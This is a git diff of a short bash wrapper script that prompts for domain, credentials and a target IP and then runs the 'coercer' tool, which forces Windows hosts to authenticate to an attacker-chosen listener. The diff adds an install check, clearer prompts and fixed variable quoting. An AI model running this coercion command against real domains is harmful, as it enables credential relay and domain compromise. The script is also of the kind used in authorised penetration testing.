@@ -6,22 +6,28 @@ GREEN="\033[32m"
 
 echo -e "${BOLD}${RED}wow !  coercer Request sender ---<${RESET}"
 
-echo -e "${BOLD}${GREEN}====> Have you installed the coercer ? tool, pipx install coercer <====${RESET}"
+if ! command -v coercer &> /dev/null; then
+    echo -e "${RED}[!] Coercer not found! Install with: pipx install coercer${RESET}"
+    exit 1
+fi
 
-echo "Full Domain"
+echo -e "${GREEN}[+] Coercer found! Starting...${RESET}"
+
+echo "Full Domain (e.g., dc01.corp.com):"
 read full_domain
 
-echo "Domain:-"
+echo "NetBIOS Domain (e.g., corp.com):"
 read domain
 
-echo "username:-
+echo "Username:"
 read username
 
-echo "Password:-"
-read password
+echo "Password:"
+read  password
 
-echo "IP address"
+echo "Target IP:"
 read ip
 
 
-coercer coerce -u $user -p '$password' -d $domain -l $full_domain -t $ip
+echo -e "${GREEN}[+] Running Coercer...${RESET}"
+coercer coerce -u "$username" -p "$password" -d "$domain" -l "$full_domain" -t "$ip" 
